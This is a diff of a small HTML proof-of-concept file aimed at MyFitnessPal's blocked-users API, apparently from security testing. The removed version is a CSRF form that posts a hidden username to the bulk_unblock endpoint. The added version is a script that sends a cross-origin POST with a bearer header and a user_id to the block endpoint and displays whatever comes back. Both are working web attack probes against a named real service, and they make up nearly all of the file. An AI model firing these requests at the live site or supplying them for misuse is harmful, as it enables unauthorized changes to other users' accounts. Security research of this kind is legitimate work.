@@ -1,11 +1,34 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <body>
-    <h3>CSRF PoC — bulk_unblock (usernames[])</h3>
-    <form action="https://www.myfitnesspal.com/api/services/blocked_users/bulk_unblock" method="POST">
-      <!-- repeat for multiple usernames -->
-      <input type="hidden" name="usernames[]" value="MyFitnessPal">
-      <button type="submit">Send PoC (click to run)</button>
-    </form>
-  </body>
+<head>
+  <title>CORS Test PoC</title>
+</head>
+<body>
+<h2>CORS Test with Authorization Header</h2>
+<pre id="output">Running test...</pre>
+
+<script>
+const url = "https://www.myfitnesspal.com/api/services/blocked_users/block";
+
+fetch(url, {
+    method: "POST",
+    mode: "cors", // Forces CORS handling
+    headers: {
+        "Authorization": "Bearer dummy-value",
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        // Example payload – adjust based on real request
+        user_id: 12345
+    })
+})
+.then(response => response.text())
+.then(data => {
+    document.getElementById("output").textContent = "Response received:\n" + data;
+})
+.catch(error => {
+    document.getElementById("output").textContent = "CORS or network error:\n" + error;
+});
+</script>
+</body>
 </html>
